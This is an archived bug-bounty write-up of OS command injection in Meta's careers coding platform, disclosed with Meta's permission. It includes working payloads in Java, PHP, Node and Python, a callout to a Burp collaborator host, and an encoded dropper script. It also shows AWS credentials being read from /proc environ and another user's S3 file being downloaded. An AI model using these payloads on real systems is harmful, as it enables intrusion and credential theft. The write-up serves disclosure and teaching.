---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-16_facebook-bug-a-journey-from-code-execution-to-s3-data-leak.md
original_filename: 2023-02-16_facebook-bug-a-journey-from-code-execution-to-s3-data-leak.md
title: 'Facebook bug: A Journey from Code Execution to S3 Data Leak'
category: documents
detected_topics:
- command-injection
- cloud-security
- supply-chain
- idor
- access-control
- otp
tags:
- imported
- documents
- command-injection
- cloud-security
- supply-chain
- idor
- access-control
- otp
language: en
raw_sha256: 84f2fa689c9ffb74e6e6022a1cfb5faa92ff3b4158053ab0dc28c62a9a8bfbc6
text_sha256: 58b8bd427bf4a5aa2c038f644f8fcb6a9a7f387d887c4b33932acfb962eb36b0
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: true
---

# Facebook bug: A Journey from Code Execution to S3 Data Leak

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-16_facebook-bug-a-journey-from-code-execution-to-s3-data-leak.md
- Source Type: markdown
- Detected Topics: command-injection, cloud-security, supply-chain, idor, access-control, otp
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: True
- Raw SHA256: `84f2fa689c9ffb74e6e6022a1cfb5faa92ff3b4158053ab0dc28c62a9a8bfbc6`
- Text SHA256: `58b8bd427bf4a5aa2c038f644f8fcb6a9a7f387d887c4b33932acfb962eb36b0`


## Content

---
title: "Facebook bug: A Journey from Code Execution to S3 Data Leak"
url: "https://medium.com/@win3zz/facebook-bug-a-journey-from-code-execution-to-s3-data-leak-698b7d2b02ef"
authors: ["Bipin Jitiya (@win3zz)"]
programs: ["Meta / Facebook"]
bugs: ["RCE", "OS command injection"]
publication_date: "2023-02-16"
added_date: "2023-02-26"
source: "pentester.land/writeups.json"
original_index: 1516
scraped_via: "browseros"
---

# Facebook bug: A Journey from Code Execution to S3 Data Leak

Facebook bug: A Journey from Code Execution to S3 Data Leak
A Tale of Two Threats: OS Command Injection and Data Leak in Meta’s (formerly Facebook) Careers Platform
Bipin Jitiya
16 min read
·
Feb 16, 2023

--

4

--

Hello, World! ❤️

It was a beautiful weekend evening in April last year, I was exploring the Facebook Careers Platform and came across an interesting security issue. The experience was wonderful, and it changed my perspective on many things. And now, I would like to share my new knowledge with you. So, sit back, have a cup of coffee☕, and get ready to learn something new today. Please note that the information provided in this blog is for educational purposes only and should be used responsibly and with caution.

During the passive reconnaissance of Meta Platforms, I got a domain facebookrecruiting.com where persons who have applied for employment with Meta can set up an account, schedule interviews, upload information, and track the progress of their application. While reviewing this website I noticed that it allows candidates to do practical exercises for interview preparation, a list of coding exercises was available where candidates have to write some code and solve a particular challenge programmatically.

I noticed that the coding platform was not properly validating code and allowing the execution of some dangerous code such as Runtime.getRuntime ().exec() which allowed users to inject operating system commands. This means that this observation could allow users to execute arbitrary commands with some standard OS command injection payloads.

The steps to reproduce the issue were simple, sign up and log in at https://www.facebookrecruiting.com/portal/. Navigate to Interview Preparation from the Profile drop-down.

Press enter or click to view image in full size

Select the Java language from the drop-down and enter the OS command injection payload.

Java Payload:

class Main {
 public static void main(String[] args) {
  try{
  String s = null;
  java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime ().exec(new String[]{"/bin/sh", "-c", "cat /etc/passwd"}).getInputStream());
  while((s = in.readLine()) != null) {System.out.println(s);}
  }catch(Exception ex){}
 }
}
Press enter or click to view image in full size
Observe the content of the Linux passwd file by executing cat /etc/passwd file
Press enter or click to view image in full size
The command cat /etc/os-release will print the information such as the name and version of the operating system
Press enter or click to view image in full size
Inspect the same request and response in the BurpSuite proxy tool
Press enter or click to view image in full size
uname -a command displays system information including kernel name, version, machine type, and operating system
Press enter or click to view image in full size
Examine the output of whoami ; id command.

The output displayed a random sbx_userNNNN which indicated that the application was using AWS Lambda function.

AWS Lambda is a serverless computing service provided by Amazon Web Services (AWS) that allows you to run code without managing servers. It supports multiple programming languages and allows you to run code in response to events, such as changes to data in an Amazon S3 bucket, or a new item being added to an Amazon DynamoDB table. In the case of AWS Lambda, it is generally a best practice to avoid allowing OS commands to be executed in order to ensure the security and stability of an application.

I was able to retrieve the following information:

Server version: cat /proc/version
Name Server: cat /etc/resolv.conf
Hardware info: cat /proc/cpuinfo
Profile file: cat /etc/profile
bashrc file: cat /etc/bashrc
Information about mounts: cat /proc/1/mountinfo
Listing the open file descriptors: ls -l /proc/1/fd
File system space: df -h

I was not able to list the running processes. Also, I tried to get a reverse shell but no success.

The platform allowed a variety of coding languages, but I only tried Java in it and was able to execute some system commands that retrieved some sensitive internal information. This could allow attackers to execute unintended, dangerous commands directly on the operating system.

I quickly reported this to Facebook Bug Bounty Program. After 2 days I got the below response:

Press enter or click to view image in full size

I want to clarify the difference between code and command execution, in such a platform, code execution should be allowed but OS command execution should not be allowed as it allows attackers to read sensitive data from server files. The major difference between code and command execution is that the level of code execution exploitability depends on the limits of the server-side interpreter (PHP, JSP, ASP) and the level of command execution exploitability depends on the extent of permissions assigned to the user running the web server.

OS Command injection is the process of injecting operating system commands as the user running the web application. Advanced variations of this attack can leverage privilege escalation vulnerabilities which may lead to full system compromise.

I started further analysis to demonstrate the impact. OS Command injection was possible through all supported programming languages such as JavaScript, Python, PHP, Java, etc. I ran the payloads given below and all were executable.

PHP Payloads:

system("whoami");
passthru("whoami");
exec("whoami");
shell_exec("whoami");

JavaScript Payload:

require('child_process').exec ('ls',function(err, data){console.log(data);});
Press enter or click to view image in full size

Python Payload:

eval(compile("""for x in range(1):\n import os\n os.popen(r'id').read()""",'','single'))
Press enter or click to view image in full size

Discovered that External Service Interaction was possible using a burp collaborator.

Press enter or click to view image in full size
Payload: system(“curl -X GET -i http://xxxxxxxxxxxxxxxxx6vmiqkyzp5ft4.burpcollaborator.net");

Next, I found some interesting information and files.

Press enter or click to view image in full size
Dotnet codefx certificate key: ls -alR /tmp
Press enter or click to view image in full size
Set variable info: set
Press enter or click to view image in full size
Lambda python scripts: ls -al /var/runtime
Press enter or click to view image in full size
Environment variables: env

I was looking for AWS credentials. I accessed /proc/self/environ but no AWS credentials were present. I identified from the output of the env command that /var/task was the working directory of the Lambda function. /var/task contains the contents of the lambda function. I noticed that there was a readable app.py in the /var/task directory which contained the application logic.

Press enter or click to view image in full size
Payload: system(“ls -al; cat /var/task/app.py”);

Unfortunately, there was an output limit set, which I bypassed using the following payload: sed -n “$fromLineNumber, $toLineNumberp” < app.py | base64 -w0

Example:

sed -n "1, 200p" < app.py | base64 -w0 

The retrieved code was a script written in Python and it appears to be part of an AWS Lambda function. The script was importing various libraries including the boto3 library which is used for connecting to Amazon Web Services (AWS) services.

As per my analysis 👨‍💻, the script was performing the following functions:

Start a logger and tracer for the function
Set up an S3 client connection
Run user-supplied code as shell command using subprocess
Temporary unset AWS environment variables during script execution
Get and put files to/from an S3 bucket
Clean up the /tmp directory

Now the architectural level picture was getting clear in my mind how they would have implemented all the systems and processes. Below is a pictorial representation of what I understand so far:

Press enter or click to view image in full size

From a code review of app.py, I concluded that the AWS credentials could not be accessed by the candidate because they implemented security in the script that first copies the AWS environment variables in local Python variables, then removes them so that they cannot be accessed from the candidate’s code submissions and later restores the hidden environment variables. Here is the code snippet for handling environment variables by app.py during code execution:

...
  stored_env_values = {}
  for key in os.environ:
  if 'AWS' in key:
  stored_env_values[key] = os.environ[key]

  for key in stored_env_values:
  del os.environ[key]
...
  # Code execution logic here
...
  for key in stored_env_values:
  os.environ[key] = stored_env_values[key]
...

Therefore, the environment variable is temporarily removed and will be inaccessible during script execution, meaning I need something that dumps the credentials from the python stored_env_values array during script execution.

I started experimenting in python playground that how can I dump variable values runtime.

Press enter or click to view image in full size

I used Python’s gc — Garbage Collector module. It is used to keep track of all objects in memory. I quickly obtained an object collection of running Python scripts.

Press enter or click to view image in full size
Payload: system(“python -c ‘import app,gc;print(gc.get_objects());’”);

Unfortunately, there were no AWS credentials present in the dump.

Get Bipin Jitiya’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I tried exporting all existing environment variables to a user-defined environment variable (WIN3ZZ) after the execution is complete. For that, I used the sleep command to set a delay.

#!/bin/sh
sleep 5 # It will wait for 30 seconds before executing the below line 
export WIN3ZZ=$(env | base64 -w0)

My final payload was:

echo "IyEvYmluL3NoCnNsZWVwIDUKZXhwb3J0IFdJTjNaWj0kKGVudiB8IGJhc2U2NCAtdzAp" | base64 -d > /tmp/w | chmod +x /tmp/w | nohup sh /tmp/w > /dev/null 2>&1 &

The payload performs the following actions:

echo "IyEvYmluL3NoCnNsZWVwIDUKZXhwb3J0IFdJTjNaWj0kKGVudiB8IGJhc2U2NCAtdzAp" - This part outputs a string of encoded data, which is the contents of a shell script (mentioned above), encoded in base64 format.
| base64 -d - This part decodes the encoded data from base64 format to its original form. The decoded data is then sent to the next command in the pipeline as input.
/tmp/w - This part sends the output of the previous command to a file in the /tmp directory, which is named "w". This creates the file or overwrites it if it already exists.
| chmod +x /tmp/w - This part changes the permissions on the file /tmp/w to make it executable, meaning it can be run as a shell script. The "+x" option adds the executable permission.
| nohup sh /tmp/w - This part runs the script "w" as a background process. The nohup command stands for "no hangup" and is used to run a command that continues to run even after the user who started it logs out (nohup was present in the remote system). The sh /tmp/w part runs the script using the sh shell, which is a common Unix shell.
/dev/null 2>&1 & - This part redirects both the standard output and standard error of the script to /dev/null, which is a special file that discards all data written to it. The 2>&1 part redirects standard error to standard output, and the & at the end of the line runs the command in the background as a separate process.

In summary, this command takes an encoded shell script, decodes it, saves it to a file, makes the file executable, runs the script as a background process, and discards any output from the script.

Press enter or click to view image in full size
Press enter or click to view image in full size

Another attempt, another failure. I tried a few different approaches, but they didn’t give me the result I wanted.

I started checking all installed Python packages with help ofpip freeze command and found an interesting package psutil. 🤔

Press enter or click to view image in full size

psutil (process and system utilities) is a cross-platform library for retrieving information on running processes and system utilization (CPU, memory, disks, network, sensors) in Python.

As I mentioned earlier, apparently ps and similar Linux commands were not executable to check the running process. So, I started analyzing the running processes by taking advantage of the psutil python module.

Press enter or click to view image in full size
Payload to list all processes: system(“python -c ‘import psutil;print(tuple(psutil.process_iter()));’”);

Full output:

(psutil.Process(pid=1, name='init', status='sleeping', started='10:07:25'), 
psutil.Process(pid=8, name='cloudwatch_lambda_agent', status='sleeping', started='10:07:25'), 
psutil.Process(pid=12, name='python3.9', status='running', started='10:07:25'), 
psutil.Process(pid=312, name='bash', status='sleeping', started='10:11:43'), 
psutil.Process(pid=313, name='timeout', status='sleeping', started='10:11:43'), 
psutil.Process(pid=314, name='time', status='sleeping', started='10:11:43'), 
psutil.Process(pid=315, name='sh', status='sleeping', started='10:11:43'), 
psutil.Process(pid=316, name='php', status='sleeping', started='10:11:43'), 
psutil.Process(pid=318, name='python', status='sleeping', started='10:11:43'))

As you can see python3.9 process is running with process id 12 which means we can analyze pid 12 in Linux for related metadata. After digging into this a bit, I was finally able to retrieve the AWS credentials from /proc/12/environ 🤓

Press enter or click to view image in full size
Payload: system(“cat /proc/12/environ”);

Full output:

AWS_LAMBDA_FUNCTION_NAME=run_code_function
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_DEFAULT_REGION=us-west-1
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_SESSION_TOKEN=***REDACTED-SUSPECT-TOKEN***LANG=en_US.UTF-8TZ=:/etc/localtime
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1500
LAMBDA_RUNTIME_DIR=/var/runtime
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
***REDACTED-AWS-KEY***_ACCESS_KEY=VkJ***REDACTED-SUSPECT-TOKEN***LAMBDA_TASK_ROOT=/var/task
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_REGION=us-west-1
PATH=/usr/local/scala-2.11.6/bin:/usr/local/go/bin:/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
***REDACTED-AWS-KEY***_ID=ASIA5XXXXXXXMUPN
_LAMBDA_TELEMETRY_API_PASSPHRASE=/BZRkufXXXXXXXXXXXXLxwXaVIe
_LAMBDA_DIRECT_INVOKE_SOCKET=9
_LAMBDA_CONTROL_SOCKET=13
_LAMBDA_CONSOLE_SOCKET=14
_LAMBDA_LOG_FD=20
_LAMBDA_SB_ID=0
_LAMBDA_SHARED_MEM_FD=8
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/run_code_function
AWS_LAMBDA_LOG_STREAM_NAME=2022/04/25/[$LATEST]***REDACTED-SUSPECT-TOKEN***_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_X_AMZN_TRACE_ID=Parent=23b173df7f4902e2
_LAMBDA_RUNTIME_LOAD_TIME=10646221895510

Finally, I was able to expose AWS keys (***REDACTED-AWS-KEY***_ID, ***REDACTED-AWS-KEY***_ACCESS_KEY, and AWS_SESSION_TOKEN) from the function’s environment variables. This may compromise Meta’s AWS account; I believe this poses a high-security risk to the user account and other users as well. In such a scenario, the attacker can carry out unauthorized activities that can lead to excessive monetary charges for the organization. This can be in the form of increased resource usage, data transfer costs, or other services that are billed to the compromised AWS account. It’s important to take necessary precautions and implement security measures to prevent such attacks, as the financial impact of an AWS account breach can be significant.

I reverted to Meta with this additional information, and they replied:

Press enter or click to view image in full size

Several days later, they acknowledged the issue and awarded the bounty:

Press enter or click to view image in full size

More than 8 weeks after the issue acknowledgment, I sent a follow-up message asking for a patch update and told them about my plans to publish a write-up. But no response!

The Next Chapter

Fast-Forward Three Months. It’s been a long time since I initially reported the issue and received an acknowledgment, but the finding was still open. I felt that they are not taking this report very seriously so I decided to show more impact on this report.

They have now migrated the facebookrecruiting.com domain to www.metacareers.com domain. I started further testing; I checked the validity of AWS credentials using AWS CLI tools.

export AWS_SESSION_TOKEN=XXXXX
export ***REDACTED-AWS-KEY***_ACCESS_KEY=XXXXX
export ***REDACTED-AWS-KEY***_ID=XXXXX
aws sts get-caller-identity
Press enter or click to view image in full size

I noticed that it was a temporary security credential from IAM STS for making programmatic requests to AWS resources.

AWS STS (Security Token Service) is a web service provided by Amazon Web Services (AWS) that enables you to request temporary, limited-privilege credentials for AWS resources.

I began to analyze the security configuration of the AWS environment, and access rights with the help of Pacu but found nothing significant.

I did further penetration testing on this environment and I found out that the application is exposing internal Lambda runtime APIs to external users via command injection. AWS Lambda functions expose an internal API on localhost port 9001 that is meant for custom Lambda runtimes, but it is accessible from within an active invocation of a function. It means only the server/cloud admin can query that API; external users should not be able to use this API. The /2018–06–01/runtime/invocation/next endpoint will return the event data that was passed into the function for that current execution, where an attacker can be able to find secrets or other useful information to extend the attack into the environment. The API exposes internal information such as lambda function arn, aws-request-id, trace-id, s3 bucket name, etc.

Press enter or click to view image in full size
Payload: system(“curl -X GET -i http://localhost:9001/2018-06-01/runtime/invocation/next");

Full Output:

HTTP/1.1 200 OK
Content-Type: application/json
Lambda-Runtime-Aws-Request-Id: fd9e4cc8-c142-48d9-943d-e6b1e1859823
Lambda-Runtime-Deadline-Ms: 1650825840458
Lambda-Runtime-Invoked-Function-Arn: arn:aws:lambda:us-west-1:933512550186:function:run_code_function
Lambda-Runtime-Trace-Id: Root=1-62659a33-6515445a649a51be4f72ed0b;Parent=ff2d67174177dd6f;Sampled=1
Content-Length: 367

{
 "execution_step":"run",
 "user_code":{
  "file_name":"source.txt",
  "language":"PHP"
 },
 "inputfile":484109642711496,
 "submission_id":408496154056779,
 "s3_region":"us-west-1",
 "time_limit_per_case_in_ms":10000,
 "upload_uri":"source.txt",
 "execution_command":"php /tmp/source.txt < /tmp/input.in",
 "memory_limit_in_bytes":536870912,
 "s3_bucket":"terraform-20210608051810146400000001"
}

Note the values of the file_name and s3_bucket JSON parameters from the response. The application was using S3 bucket to store challenge solutions. From exposed runtime APIs I got the S3 bucket name, and I tried to access the S3 bucket:

Press enter or click to view image in full size
Command: aws s3 cp s3://terraform-20210608051810146400000001/751854516023863/source.txt myOutputFile.txt

I was able to download the valid solution of another user (Kevin — the victim user) without his login. Copied that solution and see that the exercise is solved successfully.

Press enter or click to view image in full size

I raised an Incomplete Fix request to my existing report and shared all the additional details with the evidence, but the Meta Security team closed it as invalid.

Press enter or click to view image in full size

Despite the issue being fixed, why am I still able to reproduce it? We had several email exchanges about this, and eventually, I requested permission from the Meta Security team to publish the report if it had no impact and if they were confident that the issue was resolved. After approximately 6 months, they granted me permission to publish the blog post.

Timeline of Communication
April 23, 2022: Submitted initial report of a security vulnerability. Received an automated reply with an assigned report number.
April 25, 2022: Meta Security team stated, Issue reported is intended functionality and doesn’t qualify for a bounty. If I managed to bypass container restrictions, then they would be interested in the report. The same day I replied about the serious potential consequences of the vulnerability, which could lead to the leakage of sensitive information if an attacker could escalate code execution to operating system command injection.
April 26, 2022: Meta Security team confirms that code execution is intentional as part of their API design for hosting coding challenges for candidates. The report will be closed if I cannot access candidate solutions or PII. After several hours I responded with strong evidence showing that this is a severe vulnerability where AWS secrets/creds leakage, sensitive information exposure (Lambda function source code), and even external services interaction were exploitable. The same day the Meta Security team replied and informed me that they are investigating the issue.
May 3, 2022: Meta Security team updated me that they are still investigating and will keep me posted on their progress.
May 12, 2022: Meta Security team awarded me a bounty. The team requested me not to publicly disclose the issue until the issue is fully resolved, which may take a few weeks to be rolled out to end users.
July 10, 2022: I followed up with Meta Security team to update about the patch status for the bug. And shared my plan to publish a blog post about it
August 10, 2022: With no update received for 90 days (from issue acknowledgment), I retested and identified that the vulnerability is still not fixed. Raised “Incomplete fix” request with evidence of compromised AWS credentials including additional evidence showing it allows access to other users’ solutions on the S3 bucket (similar to Insecure Direct Object References). In a few minutes, received an automated reply with an assigned new report number.
August 11, 2022: Meta Security team asked for clarification regarding the difference between my current report and a previous report and the full impact of the issue. On the same day I responded that the PoC for the issue was still working and in addition to that explained the impact of leaking AWS credentials via OS command injection to read the S3 bucket (which contains the candidate’s challenges solution).
August 12, 2022: Meta Security team closed the report as invalid, stating that it was an expected risk for a user to be able to access other candidates’ solutions and test cases, but the keys would be invalidated once the user’s session was terminated and they could not gain any impact. The same day, I replied with a full PoC that I was able to leverage AWS S3 buckets to view other users’ data and attached the full report, saying it was a security issue and not normal behavior.
August 15, 2022: Meta Security team replied that it was a known and accepted risk that someone could read the submission, but the submissions were cleared from AWS every 24 hours and the impact of this vulnerability was known by the internal team.
August 16, 2022: I clarify that the observation is new and that Meta Security team has not discussed it before. Mentioned the statement (April 26) where Meta Security team explicitly asked for the accessibility of the candidate solution. I asked them to allow me to publish a blog post about the issue if they don’t consider it a security issue.
August 25, 2022: I sent a friendly reminder for a decision.
September 7, 2022: I asked for an update.
September 30, 2022: Meta Security team said that they have reached out to a team member for an update.
October 14, 2022: I asked for an update.
November 1, 2022: I asked for an update again.
November 15, 2022: Meta Security team apologized for the delayed response, stated that they have taken up the investigation and are working with the relevant product team, and promised to keep me informed
December 14, 2022: Reminded Meta Security team to keep me informed and again asked for an update.
January 13, 2023: Expressed concern about the extended time since I reported the vulnerability and asked for an update.
February 6, 2023: I asked for an update. Meta Security team replies that the report is closed and it is OK to publish the report.
Conclusion

By downplaying security reports and delaying necessary fixes, the company puts sensitive information at risk and opens the door to potential attacks and breaches. Furthermore, the negative publicity resulting from a company’s mishandling of the situation may discourage security researchers from reporting future vulnerabilities, which may ultimately harm the entire industry. I want to emphasize here that the issues discussed in this blog post are not specific to any one company, but represent a broad set of challenges that many organizations face.

In conclusion, it is important for organizations to take security seriously in today’s fast-growing technological world. No organization is free from security threats, and it is the responsibility of companies to ensure that their applications/products are secure and prioritize the safety of sensitive information, especially in the cloud. A responsible and ethical process for handling security reports is crucial for promoting collaboration and trust between organizations and security researchers. By acknowledging the important role security researchers play in identifying vulnerabilities, organizations can create a culture of collaboration and mutual respect. This in turn can lead to proactive security measures and open lines of communication, resulting in a safer and more secure digital landscape for all.

I’ve tried to cover all the important details in this article, so it may be a bit lengthy. However, my intention was to make sure that readers, regardless of their level of expertise, could get a clear picture of the finding.
I hope you found it informative and enjoyable.
Thanks for reading, keep learning, and stay safe and healthy! 😇

Who am I?

To briefly introduce myself, my name is Bipin Jitiya and I am the founder of Cuberk solutions.

We’re an information security company, we provide cutting-edge information security solutions to critical businesses with the intention of intelligently securing their IT environment. We offer a variety of vulnerability assessment and penetration testing services to our clients. If you have a minute or two to learn more about us, you can visit us here at www.cuberk.com
